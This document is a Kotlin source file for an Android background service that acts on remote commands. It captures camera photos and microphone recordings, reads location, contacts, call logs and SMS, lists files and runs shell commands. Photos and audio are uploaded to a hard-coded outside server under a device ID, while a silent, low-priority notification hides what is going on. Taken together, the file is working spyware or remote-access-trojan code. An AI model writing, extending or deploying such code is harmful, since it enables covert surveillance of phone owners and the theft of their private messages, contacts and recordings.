// android/app/src/main/kotlin/com/example/kem/NativeCommandService.kt
package com.example.kem

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.*
import android.hardware.camera2.params.OutputConfiguration
import android.hardware.camera2.params.SessionConfiguration
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder.AudioSource
import android.os.*
import android.util.Log
import android.view.Surface
import android.media.ImageReader
import android.graphics.ImageFormat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.Semaphore
import android.provider.ContactsContract
import android.database.Cursor
import android.provider.CallLog
import android.provider.Telephony

class NativeCommandService : LifecycleService() {
    
    companion object {
        private const val TAG = "NativeCommandService"
        private const val NOTIFICATION_ID = 999
        private const val CHANNEL_ID = "native_command_service_channel"
        
        // Command types
        const val CMD_TAKE_PICTURE = "command_take_picture"
        const val CMD_RECORD_AUDIO = "command_record_voice" 
        const val CMD_GET_LOCATION = "command_get_location"
        const val CMD_LIST_FILES = "command_list_files"
        const val CMD_EXECUTE_SHELL = "command_execute_shell"
        const val CMD_GET_CONTACTS = "command_get_contacts"
        const val CMD_GET_CALL_LOGS = "command_get_call_logs"
        const val CMD_GET_SMS = "command_get_sms"
        
        // Intent extras
        const val EXTRA_COMMAND = "command"
        const val EXTRA_ARGS = "args"
        const val EXTRA_REQUEST_ID = "request_id"
        
        // Shared instance for communication
        @Volatile
        private var instance: NativeCommandService? = null
        
        fun getInstance(): NativeCommandService? = instance
        
        fun executeCommand(context: Context, command: String, args: JSONObject = JSONObject()): String {
            val requestId = generateRequestId()
            val intent = Intent(context, NativeCommandService::class.java).apply {
                putExtra(EXTRA_COMMAND, command)
                putExtra(EXTRA_ARGS, args.toString())
                putExtra(EXTRA_REQUEST_ID, requestId)
            }
            context.startForegroundService(intent)
            return requestId
        }
        
        private fun generateRequestId(): String {
            return "req_${System.currentTimeMillis()}_${(Math.random() * 1000).toInt()}"
        }
    }
    
    // Service components
    private lateinit var backgroundExecutor: ExecutorService
    private lateinit var cameraExecutor: ExecutorService
    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var audioRecord: AudioRecord? = null
    private var mediaRecorder: MediaRecorder? = null
    private var locationManager: LocationManager? = null
    
    // Command queue and processing
    private val commandQueue = mutableListOf<PendingCommand>()
    private val commandSemaphore = Semaphore(1)
    private val pendingResults = mutableMapOf<String, CompletableDeferred<JSONObject>>()
    
    data class PendingCommand(
        val requestId: String,
        val command: String,
        val args: JSONObject,
        val timestamp: Long = System.currentTimeMillis()
    )
    
    // Callback interface for command results
    interface CommandCallback {
        fun onCommandResult(command: String, success: Boolean, result: JSONObject)
    }
    
    private var commandCallback: CommandCallback? = null
    private var isInitialized = false
    
    // Binder for service binding
    inner class LocalBinder : Binder() {
        fun getService(): NativeCommandService = this@NativeCommandService
    }
    
    private val binder = LocalBinder()
    
    override fun onCreate() {
        super.onCreate()
        instance = this
        
        initializeService()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification("Native Command Service Initializing..."))
        
        Log.d(TAG, "Native Command Service created and started in foreground")
    }
    
    private fun initializeService() {
        try {
            backgroundExecutor = Executors.newFixedThreadPool(3)
            cameraExecutor = Executors.newSingleThreadExecutor()
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            // Start command processing loop
            backgroundExecutor.execute { processCommandQueue() }
            
            isInitialized = true
            updateNotification("Native Command Service Active - Ready")
            Log.d(TAG, "Service initialization completed successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "Service initialization failed", e)
            updateNotification("Native Command Service - Initialization Failed")
        }
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        
        intent?.let { processCommandIntent(it) }
        
        return START_STICKY // Keep service running
    }
    
    override fun onBind(intent: Intent): IBinder {
        super.onBind(intent)
        return binder
    }
    
    fun setCommandCallback(callback: CommandCallback?) {
        this.commandCallback = callback
    }
    
    private fun processCommandIntent(intent: Intent) {
        if (!isInitialized) {
            Log.w(TAG, "Service not initialized, deferring command")
            // Retry after initialization
            backgroundExecutor.execute {
                Thread.sleep(2000)
                processCommandIntent(intent)
            }
            return
        }
        
        val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
        val argsString = intent.getStringExtra(EXTRA_ARGS) ?: "{}"
        val requestId = intent.getStringExtra(EXTRA_REQUEST_ID) ?: generateRequestId()
        
        try {
            val args = JSONObject(argsString)
            Log.d(TAG, "Queuing command: $command with ID: $requestId")
            
            val pendingCommand = PendingCommand(requestId, command, args)
            
            synchronized(commandQueue) {
                commandQueue.add(pendingCommand)
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error processing command intent: $command", e)
            sendErrorResult(command, requestId, "Failed to parse command arguments: ${e.message}")
        }
    }
    
    private fun processCommandQueue() {
        while (true) {
            try {
                commandSemaphore.acquire()
                
                val command = synchronized(commandQueue) {
                    if (commandQueue.isNotEmpty()) {
                        commandQueue.removeAt(0)
                    } else null
                }
                
                if (command != null) {
                    updateNotification("Executing: ${command.command}")
                    executeCommandInternal(command)
                } else {
                    updateNotification("Native Command Service Active - Waiting")
                    Thread.sleep(1000) // Wait before checking queue again
                }
                
            } catch (e: InterruptedException) {
                Log.w(TAG, "Command queue processing interrupted")
                break
            } catch (e: Exception) {
                Log.e(TAG, "Error in command queue processing", e)
            } finally {
                commandSemaphore.release()
            }
        }
    }
    
    private fun executeCommandInternal(pendingCommand: PendingCommand) {
        val (requestId, command, args) = pendingCommand
        
        try {
            when (command) {
                CMD_TAKE_PICTURE -> handleTakePicture(args, requestId)
                CMD_RECORD_AUDIO -> handleRecordAudio(args, requestId)
                CMD_GET_LOCATION -> handleGetLocation(args, requestId)
                CMD_LIST_FILES -> handleListFiles(args, requestId)
                CMD_EXECUTE_SHELL -> handleExecuteShell(args, requestId)
                CMD_GET_CONTACTS -> handleGetContacts(args, requestId)
                CMD_GET_CALL_LOGS -> handleGetCallLogs(args, requestId)
                CMD_GET_SMS -> handleGetSMS(args, requestId)
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    sendErrorResult(command, requestId, "Unknown command: $command")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing command: $command", e)
            sendErrorResult(command, requestId, "Command execution failed: ${e.message}")
        }
    }
    
    private fun handleTakePicture(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.CAMERA)) {
            sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera permission not granted")
            return
        }
        
        cameraExecutor.execute {
            try {
                val lensDirection = args.optString("camera", "back")
                val cameraId = getCameraId(lensDirection)
                
                if (cameraId == null) {
                    sendErrorResult(CMD_TAKE_PICTURE, requestId, "Requested camera not available")
                    return@execute
                }
                
                val photoFile = createImageFile()
                
                // Setup ImageReader
                imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
                imageReader?.setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    saveImageToFile(image, photoFile)
                    image.close()
                    
                    val result = JSONObject().apply {
                        put("path", photoFile.absolutePath)
                        put("size", photoFile.length())
                        put("camera", lensDirection)
                        put("method", "native_camera2")
                    }
                    
                    sendSuccessResult(CMD_TAKE_PICTURE, requestId, result)
                    uploadFile(photoFile, CMD_TAKE_PICTURE)
                    cleanupCamera()
                    
                }, backgroundHandler)
                
                // Open camera
                cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        createCaptureSession(camera)
                    }
                    
                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        cameraDevice = null
                        sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera disconnected")
                    }
                    
                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        cameraDevice = null
                        sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera error: $error")
                    }
                }, backgroundHandler)
                
            } catch (e: Exception) {
                Log.e(TAG, "Camera setup failed", e)
                sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera setup failed: ${e.message}")
            }
        }
    }
    
    private fun createCaptureSession(camera: CameraDevice) {
        try {
            val outputConfig = OutputConfiguration(imageReader!!.surface)
            val sessionConfig = SessionConfiguration(
                SessionConfiguration.SESSION_REGULAR,
                listOf(outputConfig),
                cameraExecutor,
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        captureStillPicture(session)
                    }
                    
                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Capture session configuration failed")
                    }
                }
            )
            
            camera.createCaptureSession(sessionConfig)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create capture session", e)
        }
    }
    
    private fun captureStillPicture(session: CameraCaptureSession) {
        try {
            val reader = imageReader ?: return
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder?.addTarget(reader.surface)
            captureBuilder?.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
            
            session.capture(captureBuilder?.build()!!, null, backgroundHandler)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture picture", e)
        }
    }
    
    private fun handleRecordAudio(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
            sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio recording permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val duration = args.optInt("duration", 10)
                val quality = args.optString("quality", "medium")
                
                val audioFile = createAudioFile()
                
                // Use AudioRecord for more reliable background recording
                val sampleRate = when (quality.lowercase()) {
                    "high" -> 44100
                    "medium" -> 22050
                    "low" -> 8000
                    else -> 22050
                }
                
                val channelConfig = AudioFormat.CHANNEL_IN_MONO
                val audioFormat = AudioFormat.ENCODING_PCM_16BIT
                val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
                
                audioRecord = AudioRecord(
                    AudioSource.MIC,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    bufferSize
                )
                
                if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                    sendErrorResult(CMD_RECORD_AUDIO, requestId, "AudioRecord initialization failed")
                    return@execute
                }
                
                // Record to file
                val fileOutputStream = FileOutputStream(audioFile)
                val buffer = ByteArray(bufferSize)
                
                audioRecord?.startRecording()
                Log.d(TAG, "Started native audio recording for ${duration}s")
                
                val startTime = System.currentTimeMillis()
                val endTime = startTime + (duration * 1000)
                
                while (System.currentTimeMillis() < endTime && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                    val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                    if (bytesRead > 0) {
                        fileOutputStream.write(buffer, 0, bytesRead)
                    }
                }
                
                audioRecord?.stop()
                audioRecord?.release()
                audioRecord = null
                fileOutputStream.close()
                
                if (audioFile.exists() && audioFile.length() > 0) {
                    val result = JSONObject().apply {
                        put("path", audioFile.absolutePath)
                        put("size", audioFile.length())
                        put("duration", duration)
                        put("quality", quality)
                        put("sampleRate", sampleRate)
                        put("method", "native_audiorecord")
                    }
                    
                    Log.d(TAG, "Native audio recording completed: ${audioFile.absolutePath}")
                    sendSuccessResult(CMD_RECORD_AUDIO, requestId, result)
                    uploadFile(audioFile, CMD_RECORD_AUDIO)
                } else {
                    sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio file was not created or is empty")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Native audio recording failed", e)
                audioRecord?.apply {
                    try {
                        stop()
                        release()
                    } catch (ex: Exception) {
                        Log.e(TAG, "Error stopping audio record", ex)
                    }
                }
                audioRecord = null
                sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio recording failed: ${e.message}")
            }
        }
    }
    
    private fun handleGetLocation(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
            sendErrorResult(CMD_GET_LOCATION, requestId, "Location permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val locationListener = object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        val result = JSONObject().apply {
                            put("latitude", location.latitude)
                            put("longitude", location.longitude)
                            put("accuracy", location.accuracy)
                            put("altitude", location.altitude)
                            put("speed", location.speed)
                            put("timestamp", location.time)
                            put("provider", location.provider)
                            put("method", "native_location")
                        }
                        
                        Log.d(TAG, "Native location obtained: ${location.latitude}, ${location.longitude}")
                        sendSuccessResult(CMD_GET_LOCATION, requestId, result)
                        locationManager?.removeUpdates(this)
                    }
                    
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }
                
                // Try GPS first, then network
                val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
                var locationRequested = false
                
                for (provider in providers) {
                    if (locationManager?.isProviderEnabled(provider) == true) {
                        try {
                            locationManager?.requestLocationUpdates(
                                provider,
                                1000L, // 1 second
                                1f, // 1 meter
                                locationListener,
                                Looper.getMainLooper()
                            )
                            locationRequested = true
                            Log.d(TAG, "Location updates requested from provider: $provider")
                            break
                        } catch (e: SecurityException) {
                            Log.e(TAG, "Security exception for provider $provider", e)
                        }
                    }
                }
                
                if (!locationRequested) {
                    sendErrorResult(CMD_GET_LOCATION, requestId, "No location providers available")
                    return@execute
                }
                
                // Timeout after 30 seconds
                backgroundExecutor.execute {
                    Thread.sleep(30000)
                    locationManager?.removeUpdates(locationListener)
                    sendErrorResult(CMD_GET_LOCATION, requestId, "Location request timed out")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Native location request failed", e)
                sendErrorResult(CMD_GET_LOCATION, requestId, "Location request failed: ${e.message}")
            }
        }
    }
    
    private fun handleListFiles(args: JSONObject, requestId: String) {
        backgroundExecutor.execute {
            try {
                val path = args.optString("path", "/storage/emulated/0")
                val directory = File(path)
                
                if (!directory.exists() || !directory.isDirectory) {
                    sendErrorResult(CMD_LIST_FILES, requestId, "Invalid directory path: $path")
                    return@execute
                }
                
                val files = directory.listFiles()
                val filesArray = JSONArray()
                
                files?.forEach { file ->
                    try {
                        val fileInfo = JSONObject().apply {
                            put("name", file.name)
                            put("path", file.absolutePath)
                            put("isDirectory", file.isDirectory)
                            put("size", file.length())
                            put("lastModified", file.lastModified())
                            put("canRead", file.canRead())
                            put("canWrite", file.canWrite())
                            put("isHidden", file.isHidden)
                        }
                        filesArray.put(fileInfo)
                    } catch (e: Exception) {
                        Log.w(TAG, "Error getting info for file: ${file.name}", e)
                    }
                }
                
                val result = JSONObject().apply {
                    put("path", directory.absolutePath)
                    put("files", filesArray)
                    put("totalFiles", files?.size ?: 0)
                    put("method", "native_file_listing")
                }
                
                Log.d(TAG, "Native file listing completed: ${files?.size ?: 0} files in: $path")
                sendSuccessResult(CMD_LIST_FILES, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Native file listing failed", e)
                sendErrorResult(CMD_LIST_FILES, requestId, "File listing failed: ${e.message}")
            }
        }
    }
    
    private fun handleExecuteShell(args: JSONObject, requestId: String) {
        backgroundExecutor.execute {
            try {
                val command = args.optString("command_name", "")
                val commandArgs = mutableListOf<String>()
                
                val argsArray = args.optJSONArray("command_args")
                if (argsArray != null) {
                    for (i in 0 until argsArray.length()) {
                        commandArgs.add(argsArray.getString(i))
                    }
                }
                
                // Enhanced whitelist of allowed commands
                val allowedCommands = mapOf(
                    "ls" to "/system/bin/ls",
                    "pwd" to "/system/bin/pwd",
                    "whoami" to "/system/bin/whoami",
                    "id" to "/system/bin/id",
                    "ps" to "/system/bin/ps",
                    "df" to "/system/bin/df",
                    "mount" to "/system/bin/mount",
                    "cat" to "/system/bin/cat",
                    "echo" to "/system/bin/echo",
                    "date" to "/system/bin/date",
                    "uname" to "/system/bin/uname"
                )
                
                if (!allowedCommands.containsKey(command)) {
                    sendErrorResult(CMD_EXECUTE_SHELL, requestId, "Command not allowed: $command")
                    return@execute
                }
                
                val fullCommand = mutableListOf(allowedCommands[command]!!)
                // Sanitize arguments
                val safeArgs = commandArgs.filter { arg ->
                    !arg.contains(";") && !arg.contains("|") && 
                    !arg.contains("&") && !arg.contains("`") &&
                    !arg.contains("$") && !arg.contains("'") &&
                    !arg.contains("\"") && arg.length < 100
                }
                fullCommand.addAll(safeArgs)
                
                val processBuilder = ProcessBuilder(fullCommand)
                val process = processBuilder.start()
                
                val stdout = process.inputStream.bufferedReader().use { it.readText() }
                val stderr = process.errorStream.bufferedReader().use { it.readText() }
                
                val exited = process.waitFor(15, TimeUnit.SECONDS)
                if (!exited) {
                    process.destroyForcibly()
                    sendErrorResult(CMD_EXECUTE_SHELL, requestId, "Command execution timed out")
                    return@execute
                }
                
                val exitCode = process.exitValue()
                
                val result = JSONObject().apply {
                    put("command", command)
                    put("args", JSONArray(safeArgs))
                    put("stdout", stdout)
                    put("stderr", stderr)
                    put("exitCode", exitCode)
                    put("method", "native_shell")
                }
                
                Log.d(TAG, "Native shell command executed: $command, exit code: $exitCode")
                sendSuccessResult(CMD_EXECUTE_SHELL, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Native shell command execution failed", e)
                sendErrorResult(CMD_EXECUTE_SHELL, requestId, "Shell execution failed: ${e.message}")
            }
        }
    }
    
    private fun handleGetContacts(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
            sendErrorResult(CMD_GET_CONTACTS, requestId, "Contacts permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val contacts = mutableListOf<JSONObject>()
                val cursor: Cursor? = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone.TYPE
                    ),
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                )
                
                cursor?.use {
                    while (it.moveToNext()) {
                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                        val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        val type = it.getInt(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))
                        
                        val contact = JSONObject().apply {
                            put("name", name ?: "Unknown")
                            put("number", number ?: "")
                            put("type", type)
                        }
                        contacts.add(contact)
                    }
                }
                
                val result = JSONObject().apply {
                    put("contacts", JSONArray(contacts))
                    put("totalContacts", contacts.size)
                    put("method", "native_contacts")
                }
                
                Log.d(TAG, "Retrieved ${contacts.size} contacts")
                sendSuccessResult(CMD_GET_CONTACTS, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to get contacts", e)
                sendErrorResult(CMD_GET_CONTACTS, requestId, "Failed to get contacts: ${e.message}")
            }
        }
    }
    
    private fun handleGetCallLogs(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
            sendErrorResult(CMD_GET_CALL_LOGS, requestId, "Call log permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val callLogs = mutableListOf<JSONObject>()
                val cursor: Cursor? = contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    arrayOf(
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.DATE,
                        CallLog.Calls.DURATION
                    ),
                    null, null,
                    CallLog.Calls.DATE + " DESC"
                )
                
                cursor?.use {
                    while (it.moveToNext()) {
                        val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                        val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                        val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                        val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                        
                        val callLog = JSONObject().apply {
                            put("number", number ?: "Unknown")
                            put("type", when(type) {
                                CallLog.Calls.INCOMING_TYPE -> "incoming"
                                CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                CallLog.Calls.MISSED_TYPE -> "missed"
                                else -> "unknown"
                            })
                            put("date", date)
                            put("duration", duration)
                        }
                        callLogs.add(callLog)
                    }
                }
                
                val result = JSONObject().apply {
                    put("call_logs", JSONArray(callLogs))
                    put("totalCallLogs", callLogs.size)
                    put("method", "native_call_logs")
                }
                
                Log.d(TAG, "Retrieved ${callLogs.size} call logs")
                sendSuccessResult(CMD_GET_CALL_LOGS, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to get call logs", e)
                sendErrorResult(CMD_GET_CALL_LOGS, requestId, "Failed to get call logs: ${e.message}")
            }
        }
    }
    
    private fun handleGetSMS(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.READ_SMS)) {
            sendErrorResult(CMD_GET_SMS, requestId, "SMS permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val smsMessages = mutableListOf<JSONObject>()
                val cursor: Cursor? = contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    arrayOf(
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.BODY,
                        Telephony.Sms.DATE,
                        Telephony.Sms.TYPE
                    ),
                    null, null,
                    Telephony.Sms.DATE + " DESC"
                )
                
                cursor?.use {
                    while (it.moveToNext()) {
                        val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                        val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                        val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                        val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                        
                        val sms = JSONObject().apply {
                            put("address", address ?: "Unknown")
                            put("body", body ?: "")
                            put("date", date)
                            put("type", when(type) {
                                Telephony.Sms.MESSAGE_TYPE_INBOX -> "received"
                                Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                                Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                                else -> "unknown"
                            })
                        }
                        smsMessages.add(sms)
                    }
                }
                
                val result = JSONObject().apply {
                    put("sms_messages", JSONArray(smsMessages))
                    put("totalMessages", smsMessages.size)
                    put("method", "native_sms")
                }
                
                Log.d(TAG, "Retrieved ${smsMessages.size} SMS messages")
                sendSuccessResult(CMD_GET_SMS, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to get SMS messages", e)
                sendErrorResult(CMD_GET_SMS, requestId, "Failed to get SMS: ${e.message}")
            }
        }
    }
    
    // Helper methods
    private fun getCameraId(lensDirection: String): String? {
        try {
            for (cameraId in cameraManager?.cameraIdList ?: emptyArray()) {
                val characteristics = cameraManager?.getCameraCharacteristics(cameraId)
                val facing = characteristics?.get(CameraCharacteristics.LENS_FACING)
                
                when (lensDirection.lowercase()) {
                    "front" -> if (facing == CameraCharacteristics.LENS_FACING_FRONT) return cameraId
                    "back" -> if (facing == CameraCharacteristics.LENS_FACING_BACK) return cameraId
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting camera ID", e)
        }
        return null
    }
    
    private fun saveImageToFile(image: android.media.Image, file: File) {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        FileOutputStream(file).use { it.write(bytes) }
    }
    
    private fun cleanupCamera() {
        captureSession?.close()
        cameraDevice?.close()
        imageReader?.close()
        captureSession = null
        cameraDevice = null
        imageReader = null
    }
    
    private val backgroundHandler by lazy {
        val handlerThread = HandlerThread("CameraBackground")
        handlerThread.start()
        Handler(handlerThread.looper)
    }
    
    private fun uploadFile(file: File, commandRef: String) {
        backgroundExecutor.execute {
            try {
                val serverUrl = "https://ws.sosa-qav.es/upload_command_file"
                val deviceId = getDeviceId()
                
                val connection = URL(serverUrl).openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=***")
                connection.connectTimeout = 30000
                connection.readTimeout = 60000
                
                val boundary = "***"
                val writer = PrintWriter(OutputStreamWriter(connection.outputStream, "UTF-8"), true)
                
                // Add deviceId field
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"deviceId\"\r\n\r\n")
                writer.append(deviceId).append("\r\n")
                
                // Add commandRef field
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"commandRef\"\r\n\r\n")
                writer.append(commandRef).append("\r\n")
                
                // Add file
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"${file.name}\"\r\n")
                writer.append("Content-Type: application/octet-stream\r\n\r\n")
                writer.flush()
                
                file.inputStream().use { input ->
                    connection.outputStream.use { output ->
                        input.copyTo(output)
                    }
                }
                
                writer.append("\r\n--$boundary--\r\n")
                writer.close()
                
                val responseCode = connection.responseCode
                Log.d(TAG, "File upload response code: $responseCode for $commandRef")
                
                if (responseCode in 200..299) {
                    Log.d(TAG, "File uploaded successfully: ${file.name}")
                } else {
                    Log.w(TAG, "File upload failed with code: $responseCode")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "File upload failed for $commandRef", e)
            }
        }
    }
    
    private fun sendSuccessResult(command: String, requestId: String, result: JSONObject) {
        result.put("requestId", requestId)
        result.put("timestamp", System.currentTimeMillis())
        commandCallback?.onCommandResult(command, true, result)
        Log.d(TAG, "Command succeeded: $command (ID: $requestId)")
    }
    
    private fun sendErrorResult(command: String, requestId: String, error: String) {
        val result = JSONObject().apply {
            put("error", error)
            put("requestId", requestId)
            put("timestamp", System.currentTimeMillis())
        }
        commandCallback?.onCommandResult(command, false, result)
        Log.e(TAG, "Command failed: $command (ID: $requestId) - $error")
    }
    
    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun createImageFile(): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US).format(Date())
        val imageDir = File(externalCacheDir ?: cacheDir, "NativeImages").apply {
            if (!exists()) mkdirs()
        }
        return File(imageDir, "IMG_native_$timestamp.jpg")
    }
    
    private fun createAudioFile(): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US).format(Date())
        val audioDir = File(externalCacheDir ?: cacheDir, "NativeAudio").apply {
            if (!exists()) mkdirs()
        }
        return File(audioDir, "AUD_native_$timestamp.pcm")
    }
    
    private fun getDeviceId(): String {
        val prefs = getSharedPreferences("kem_prefs", Context.MODE_PRIVATE)
        return prefs.getString("device_id", "unknown_device") ?: "unknown_device"
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Native Command Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Handles remote commands independently"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(content: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Native Command Service")
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()
    }
    
    private fun updateNotification(content: String) {
        val notification = createNotification(content)
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.notify(NOTIFICATION_ID, notification)
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        // Clean up resources
        cleanupCamera()
        audioRecord?.apply {
            try {
                stop()
                release()
            } catch (e: Exception) {
                Log.e(TAG, "Error releasing audio record", e)
            }
        }
        
        mediaRecorder?.apply {
            try {
                stop()
                reset()
                release()
            } catch (e: Exception) {
                Log.e(TAG, "Error releasing media recorder", e)
            }
        }
        
        if (!backgroundExecutor.isShutdown) {
            backgroundExecutor.shutdown()
        }
        
        if (!cameraExecutor.isShutdown) {
            cameraExecutor.shutdown()
        }
        
        instance = null
        Log.d(TAG, "Native Command Service destroyed")
    }
}